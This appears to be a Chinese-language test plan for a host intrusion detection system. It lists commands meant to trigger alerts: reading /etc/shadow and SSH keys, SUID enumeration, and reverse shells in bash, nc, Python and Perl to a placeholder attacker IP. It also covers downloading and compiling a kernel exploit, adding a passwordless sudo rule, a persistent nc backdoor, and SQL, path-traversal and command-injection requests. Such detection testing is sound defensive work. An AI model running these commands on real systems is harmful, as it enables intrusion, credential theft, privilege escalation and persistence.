测试目的
验证 HIDS 对系统信息收集、敏感文件读取、危险工具调用等高危命令的检测能力。
bash
运行
# 1. 敏感文件读取（核心检测点）
```
cat /etc/passwd          # 读取用户信息
cat /etc/shadow          # 读取影子文件（高危，需root权限）
cat /root/.ssh/id_rsa    # 读取SSH私钥
```


# 2. 系统指纹收集（攻击者侦察行为）
```
uname -a && cat /proc/version  # 收集内核/系统版本
hostname && ip a               # 收集主机名/IP信息
ls -la /home/                  # 枚举用户目录
```
# 3. 提权前期准备（查找高权限文件）
```
find / -perm -4000 2>/dev/null  # 查找SUID权限文件
find / -perm -g=s 2>/dev/null  # 查找SGID权限文件
ps aux | grep -E 'root|sudo'   # 查找高权限进程
```
二、反弹 Shell 测试（含 curl 触发）
验证 HIDS 对后渗透阶段典型的反弹 Shell 行为的检测能力，包含直接执行、curl 传递恶意指令两种方式。
注意：需将以下命令中的 192.168.215.xxx 替换为你的攻击机 IP，4444/5555 替换为攻击机监听端口（可先用 nc -lvvp 4444 在攻击机开启监听）。
1. curl 触发反弹 Shell（模拟 HTTP 传递恶意指令）
   
```
# 方式1：curl 执行远程恶意脚本
echo 'bash -i >& /dev/tcp/192.168.215.xxx/4444 0>&1' > /tmp/shell.sh  # 本地创建测试脚本
chmod +x /tmp/shell.sh
curl -s http://127.0.0.1/tmp/shell.sh | bash  # curl触发执行

# 方式2：curl 传递Base64编码反弹Shell（规避字符检测）
curl -X POST -d "cmd=$(echo 'bash -i >& /dev/tcp/192.168.215.xxx/4444 0>&1' | base64)" http://192.168.215.165/test.php

# 方式3：curl 下载并执行反弹Shell脚本
curl -o /tmp/reverse.sh https://your-malicious-server.com/reverse.sh  # 模拟下载远程恶意脚本
chmod +x /tmp/reverse.sh && /tmp/reverse.sh
```

2. 直接执行反弹 Shell 命令

```
# Bash 反弹
bash -i >& /dev/tcp/192.168.215.xxx/4444 0>&1

# NC 反弹（需安装nc，部分系统需加 -e 参数）
nc -e /bin/bash 192.168.215.xxx 4444
nc 192.168.215.xxx 4444 -e /bin/sh

# Python 反弹（跨平台性强）
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.215.xxx",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Perl 反弹
perl -e 'use Socket;$i="192.168.215.xxx";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

三、本地提权测试
测试目的
验证 HIDS 对攻击者尝试提升系统权限行为的检测能力，包含 SUID 利用、内核 EXP 下载 / 编译、sudo 权限篡改等场景。
```
# 1. 利用SUID文件提权（模拟）
find / -perm -u=s -type f 2>/dev/null  # 枚举SUID文件
/usr/bin/find / -exec /bin/bash -p \;  # 利用find提权（测试）
/usr/bin/awk 'BEGIN {system("/bin/bash -p")}'  # 利用awk提权（测试）

# 2. curl 下载提权EXP（模拟攻击者下载漏洞利用工具）
curl -o /tmp/exp.c https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/40839.c  # 下载内核提权EXP
gcc /tmp/exp.c -o /tmp/exp  # 编译EXP（需安装gcc）
chmod +x /tmp/exp && /tmp/exp  # 执行提权测试

# 3. 篡改sudo权限（高危配置修改）
echo "testuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers  # 增加免密sudo权限
sudo -l  # 查看当前用户sudo权限（侦察行为）
```
四、木马文件查杀测试（含 curl 下载）
测试目的
验证 HIDS 对恶意文件下载、创建、执行行为的检测能力，使用国际标准测试样本（EICAR）和模拟木马脚本。
1. curl 下载恶意文件
```
# 下载EICAR测试病毒（国际标准，无实际危害，用于反病毒引擎测试）
curl -o /tmp/eicar.com https://secure.eicar.org/eicar.com
curl -o /tmp/eicar.zip https://secure.eicar.org/eicar.zip
curl -o /tmp/eicar_com.zip https://secure.eicar.org/eicar_com.zip

# 下载模拟木马脚本（自定义恶意文件）
curl -X POST -d "malware=$(echo 'while true; do nc 192.168.215.xxx 5555 -e /bin/bash; sleep 10; done' | base64)" http://192.168.215.165/upload.php -o /tmp/malware.sh
chmod +x /tmp/malware.sh && /tmp/malware.sh  # 执行木马
```
2. 本地创建恶意文件 / 后门
```
# 创建反弹Shell后门
echo '#!/bin/bash
nohup bash -i >& /dev/tcp/192.168.215.xxx/6666 0>&1 &' > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
/tmp/backdoor.sh  # 后台执行后门

# 创建隐藏木马（特殊属性）
touch /tmp/.malware  # 隐藏文件（前缀.）
chattr +i /tmp/.malware  # 锁定文件（防删除）
echo 'python -c "import os;os.system(\'rm -rf /tmp/test/*\')"' > /tmp/.malware  # 模拟恶意代码
``` 


五、其他高危行为测试（curl 示例）
测试目的
验证 HIDS 对应用层攻击、命令注入、文件读取等行为的检测能力（监控 curl 命令参数）。
```
# 1. 模拟SQL注入（curl传递注入参数）
curl "http://192.168.215.165/login.php?user=admin' or 1=1-- &pass=123456"
curl -X POST -d "username=admin' union select 1,2,3-- &password=123" http://192.168.215.165/login

# 2. 模拟任意文件读取（curl读取服务器敏感文件）
curl "http://192.168.215.165/readfile.php?file=/etc/passwd"
curl "http://192.168.215.165/readfile.php?file=../../../../etc/shadow"

# 3. 模拟命令注入（curl传递系统命令）
curl "http://192.168.215.165/exec.php?cmd=whoami;cat /etc/shadow"
curl -X POST -d "command=ls -la /root/;netstat -antp" http://192.168.215.165/exec
```

测试验证方法
执行每条测试命令后，查看 HIDS Agent 日志（通常在 /var/log/hids/ 或 /var/log/agent.log）；
登录 HIDS 管理平台，检查是否有对应的告警事件（如 “高危命令执行”“反弹 Shell 检测”“恶意文件下载”）；
重点验证：curl 命令参数监控、敏感文件读取、反弹 Shell 网络连接、SUID 文件枚举等核心场景。